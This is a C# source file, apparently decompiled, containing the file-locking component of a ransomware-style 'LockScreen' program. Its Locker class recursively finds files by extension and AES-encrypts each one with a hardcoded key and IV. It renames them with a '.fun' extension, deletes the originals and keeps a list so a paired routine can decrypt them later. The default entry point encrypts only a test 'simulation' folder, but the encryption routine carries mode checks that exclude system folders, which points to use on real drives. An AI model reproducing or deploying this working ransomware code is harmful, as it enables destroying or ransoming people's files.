using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using LockScreen;
using LockScreen.Properties;

namespace Main.Tools;

internal static class Locker
{
	private static readonly string EncryptedFileListPath = Path.Combine(Config.WorkFolderPath, "EncryptedFileList.txt");

	private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

	private const string EncryptionFileExtension = ".fun";

	private const string EncryptionPassword = "OoIsAwwF32cICQoLDA0ODe==";

	internal static void EncryptFileSystem()
	{
		HashSet<string> extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
		string dirPath = CreateFileSystemSimulation();
		EncryptFiles(dirPath, ".fun", extensionsToEncrypt);
		if (!File.Exists(EncryptedFileListPath))
		{
			string[] contents = EncryptedFiles.ToArray();
			File.WriteAllLines(EncryptedFileListPath, contents);
		}
	}

	internal static HashSet<string> GetEncryptedFiles()
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (File.Exists(EncryptedFileListPath))
		{
			string[] array = File.ReadAllLines(EncryptedFileListPath);
			foreach (string item in array)
			{
				hashSet.Add(item);
			}
		}
		return hashSet;
	}

	private static string CreateFileSystemSimulation()
	{
		string text = Path.Combine(Config.WorkFolderPath, "FileSystemSimulation");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		using (TextWriter textWriter = new StreamWriter(Path.Combine(text, "TxtTest.txt"), append: true))
		{
			textWriter.WriteLine("I am a txt test.");
		}
		using (TextWriter textWriter2 = new StreamWriter(Path.Combine(text, "NotTxtTest.nottxt"), append: true))
		{
			textWriter2.WriteLine("I am NOT a txt test.");
		}
		return text;
	}

	private static IEnumerable<string> GetExtensionsToEncrypt()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Resources.ExtenstionsToEncrypt.Split(new string[2]
		{
			Environment.NewLine,
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		hashSet.Remove(".fun");
		return hashSet;
	}

	private static IEnumerable<string> GetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string subDir in directories)
				{
					queue.Enqueue(subDir);
				}
			}
			catch (Exception ex2)
			{
				Console.Error.WriteLine(ex2);
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine(ex);
			}
			if (files != null)
			{
				string[] array = files;
				for (int j = 0; j < array.Length; j++)
				{
					yield return array[j];
				}
			}
		}
	}

	private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
	{
		foreach (string item in from file in GetFiles(dirPath)
			from ext in extensionsToEncrypt
			where file.EndsWith(ext)
			select file into file
			select new
			{
				file = file,
				fi = new FileInfo(file)
			} into t
			where t.fi.Length < 10000000L
			select t.file)
		{
			try
			{
				if (EncryptFile(item, encryptionExtension))
				{
					EncryptedFiles.Add(item);
				}
			}
			catch
			{
			}
		}
	}

	internal static void DecryptFiles(string encryptionExtension)
	{
		foreach (string encryptedFile in GetEncryptedFiles())
		{
			try
			{
				string path = encryptedFile + encryptionExtension;
				DecryptFile(path, encryptionExtension);
				File.Delete(path);
			}
			catch
			{
			}
		}
		File.Delete(EncryptedFileListPath);
	}

	private static bool EncryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (Config.StartMode != 0 && (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) || path.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("OoIsAwwF32cICQoLDA0ODe==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			EncryptFile(aesCryptoServiceProvider, path, path + encryptionExtension);
		}
		catch
		{
			return false;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void DecryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (!path.EndsWith(encryptionExtension))
			{
				return;
			}
			string outputFile = path.Remove(path.Length - 4);
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("OoIsAwwF32cICQoLDA0ODe==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			DecryptFile(aesCryptoServiceProvider, path, outputFile);
		}
		catch
		{
			return;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
		}
	}

	private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateEncryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateDecryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}
}
